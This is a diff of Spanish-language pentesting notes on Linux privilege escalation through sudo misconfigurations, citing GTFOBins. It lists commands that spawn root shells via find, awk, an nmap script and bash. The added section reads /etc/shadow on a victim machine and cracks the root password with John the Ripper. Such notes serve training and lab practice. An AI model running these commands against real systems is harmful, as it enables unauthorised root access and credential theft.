@@ -24,7 +24,7 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 	# (ALL : ALL) ALL
 	# ALL=(root) NOPASSWD: /usr/bin/find
 	
-	# Ejecutar el comando de la siguiente manera:
+# Ejecutar el comando de la siguiente manera:
 ❯ sudo find . -exec /bin/sh \; -quit
 ❯ sudo awk 'BEGIN {system("/bin/sh")}' 
 ```
@@ -34,7 +34,7 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 	
 	#  (user2) NOPASSWD: /usr/bin/nmap 
 
-	# Ejecutar el comando de la siguiente manera:
+# Ejecutar el comando de la siguiente manera:
 ❯ echo 'os.execute("/bin/sh")' > script.nse     # Ejecutar el comando en el dir '/tmp/'
 ❯ sudo -u user2 nmap --script=/tmp/script.nse
 ```
@@ -44,6 +44,20 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 	#  (user1 : user2) NOPASSWD: /bin/bash 
 
-	# Ejecutar el comando de la siguiente manera:
+# Ejecutar el comando de la siguiente manera:
 ❯ sudo -u user2 /bin/bash     
+```
+
+```bash 
+❯ sudo -l       # Ejecutar el comando 'cat' sin password 
+
+	#  (root) NOPASSWD: /bin/cat  
+
+# Ejecutar el comando en la maquina vitima de la siguiente manera:
+❯ sudo cat /etc/passwd        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'passwd'
+❯ sudo cat /etc/shadow        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'shadow'
+
+# En Kali 
+❯ unshadow passwd shadow > pwd.txt  
+❯ john pwd.txt -w=/usr/share/wordlists/john.lst   # Obtener la password del usuario 'root'
 ```
